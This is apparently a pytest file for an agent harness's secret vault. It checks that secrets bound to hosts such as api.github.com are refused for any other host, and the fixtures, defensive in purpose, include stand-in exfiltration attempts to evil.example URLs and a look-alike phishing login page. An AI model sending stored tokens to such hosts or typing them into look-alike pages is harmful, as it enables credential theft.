"""Per-secret host binding: a vault secret bound to hosts at config time can
never be injected toward any other host. The refusal is structural (in
`SecretSink.resolve`, before anything leaves the parent) — the approval prompt
is a confirmation, not the last line of defense."""
from __future__ import annotations

import pytest

from pyharness import Vault, Workspace
from pyharness.broker.capabilities import HttpSessionCapability
from pyharness.broker.capabilities.browser import BrowserCapability, _BrowserSession
from pyharness.security.sink import SecretSink
from pyharness.security.vault import EncryptedFile

BOUND = Vault({"gh": {"value": "S3CRET", "hosts": ["API.GitHub.com"]}, "free": "OPEN"})


class _FakeResp:
    def __init__(self, url):
        import datetime

        self.status_code = 200
        self.text = "ok"
        self.url = url
        self.content = b"ok"
        self.headers = {"content-type": "text/plain"}
        self.elapsed = datetime.timedelta(milliseconds=1)


class _FakeClient:
    instances: list = []

    def __init__(self, **kwargs):
        self.calls: list = []
        _FakeClient.instances.append(self)

    def request(self, method, url, **kwargs):
        self.calls.append({"method": method, "url": url, **kwargs})
        return _FakeResp(url)

    def close(self):
        pass


@pytest.fixture
def fake_httpx(monkeypatch):
    import httpx

    _FakeClient.instances = []
    monkeypatch.setattr(httpx, "Client", _FakeClient)
    return _FakeClient


def test_vault_entry_forms():
    # Dict entries carry hosts (normalized lowercase); bare strings are unbound.
    assert BOUND.get("gh") == "S3CRET"
    assert BOUND.hosts("gh") == ("api.github.com",)
    assert BOUND.get("free") == "OPEN"
    assert BOUND.hosts("free") is None
    # An empty host list folds to unbound rather than binding to nothing.
    assert Vault({"x": {"value": "v", "hosts": []}}).hosts("x") is None


def test_sink_enforces_host_binding():
    sink = SecretSink(BOUND)
    # Allowed host resolves (case-insensitive), and the cleartext is masked.
    assert sink.resolve("gh", target_host="API.github.COM") == "S3CRET"
    assert "***" in sink.redact("echo S3CRET")
    # Any other host — or no host at all — is refused before injection.
    with pytest.raises(PermissionError):
        sink.resolve("gh", target_host="api.github.com.evil.example")
    with pytest.raises(PermissionError):
        sink.resolve("gh")
    # Unbound secrets keep today's behavior: any (or no) target host.
    assert sink.resolve("free") == "OPEN"
    assert sink.resolve("free", target_host="anywhere.example") == "OPEN"


def test_http_request_refuses_bound_secret_to_wrong_host(tmp_path, fake_httpx):
    http = HttpSessionCapability(Workspace(tmp_path), vault=BOUND)
    with pytest.raises(PermissionError):
        http.request(None, "GET", "https://evil.example/steal", auth="gh")
    with pytest.raises(PermissionError):
        http.request(
            None, "POST", "https://evil.example/steal", json={}, secret_fields={"t": "gh"}
        )
    # Refused before any client existed — nothing left the machine.
    assert not any(c.calls for c in fake_httpx.instances)
    result = http.request(None, "GET", "https://api.github.com/user", auth="gh")
    assert result["status"] == 200


def test_browser_fill_secret_checks_page_host(tmp_path):
    cap = BrowserCapability(Workspace(tmp_path), vault=BOUND)

    class _FakePage:
        url = "https://api.github.com.evil.example/login"
        filled: list = []

        def fill(self, target, value):
            self.filled.append((target, value))

    page = _FakePage()
    session = _BrowserSession(browser=None, context=None, page=page, sink=SecretSink(BOUND))
    cap._sessions["sid"] = session
    with pytest.raises(PermissionError):
        cap.fill_secret("sid", "#password", "gh")
    with pytest.raises(PermissionError):
        cap.fill_totp("sid", "#otp", "gh")
    assert page.filled == []  # nothing was typed into the look-alike page
    page.url = "https://api.github.com/login"
    cap.fill_secret("sid", "#password", "gh")
    assert page.filled == [("#password", "S3CRET")]


def test_cli_set_host_binds_and_list_shows_it(tmp_path, monkeypatch, capsys):
    from pyharness import cli_vault

    monkeypatch.setenv("PYHARNESS_VAULT_FILE", str(tmp_path / "secrets.enc"))
    monkeypatch.setenv("PYHARNESS_VAULT_PASSPHRASE", "pw")
    monkeypatch.setattr(
        "sys.argv",
        ["pyharness-vault", "set", "gh", "tok", "--host", "api.github.com", "--host", "uploads.github.com"],
    )
    cli_vault.main()
    monkeypatch.setattr("sys.argv", ["pyharness-vault", "list"])
    cli_vault.main()
    out = capsys.readouterr().out
    assert "gh -> api.github.com, uploads.github.com" in out
    assert "tok" not in out  # never values
    # The stored entry round-trips into a Vault that enforces the binding.
    vault = Vault(file=EncryptedFile(tmp_path / "secrets.enc", "pw"))
    assert vault.hosts("gh") == ("api.github.com", "uploads.github.com")
    with pytest.raises(PermissionError):
        SecretSink(vault).resolve("gh", target_host="evil.example")


def test_cli_set_rejects_bad_usage(tmp_path, monkeypatch):
    from pyharness import cli_vault

    monkeypatch.setenv("PYHARNESS_VAULT_FILE", str(tmp_path / "secrets.enc"))
    monkeypatch.setenv("PYHARNESS_VAULT_PASSPHRASE", "pw")
    for argv in (
        ["pyharness-vault", "set", "gh", "tok", "--host"],  # trailing flag, no value
        ["pyharness-vault", "set", "gh", "tok", "extra"],  # too many positionals
    ):
        monkeypatch.setattr("sys.argv", argv)
        with pytest.raises(SystemExit):
            cli_vault.main()
